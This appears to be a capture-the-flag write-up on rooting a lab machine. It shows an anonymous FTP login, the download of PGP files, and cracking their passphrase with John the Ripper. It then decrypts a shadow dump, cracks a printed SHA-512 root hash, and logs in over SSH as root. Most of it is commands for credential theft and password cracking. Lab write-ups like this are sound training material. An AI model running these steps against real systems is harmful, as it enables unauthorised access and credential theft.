
 Root via Anonymous FTP + PGP Backup

## Initial Access: Anonymous FTP
Anonymous login was allowed with full filesystem access:
ftp <target_ip>
Name: anonymous
Password: 

Enumeration revealed a suspicious folder named `notread/` containing hidden PGP files.

## Looting PGP Files
Inside `notread/` we found:
- backup.pgp
- private.asc

Downloaded both for local analysis:
ftp> cd notread
ftp> get backup.pgp
ftp> get private.asc

## Cracking the PGP Private Key
The private key required a passphrase. Extracted hash with `gpg2john` and cracked using `rockyou.txt`:
gpg2john private.asc > gpg_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt
john --show gpg_hash.txt

With the cracked passphrase, imported the key:
gpg --import private.asc

## Decrypting the Backup
Decrypted the `.pgp` file to recover a shadow dump:
gpg --decrypt backup.pgp > shadow_dump.txt

This revealed password hashes, including the root user.

## Cracking the Root Hash
Extracted the root hash (`$6$` → SHA-512 crypt) and cracked it:
echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt root_hash.txt
john --show root_hash.txt

John revealed the plaintext root password.

## Privilege Escalation: Root Access
Logged in as root with SSH:
ssh root@<target_ip>
# enter cracked password

## Summary
- Anonymous FTP exposed the full filesystem  
- Hidden PGP files in `notread/` gave access to `/etc/shadow`  
- Cracked the root hash with John → direct root shell
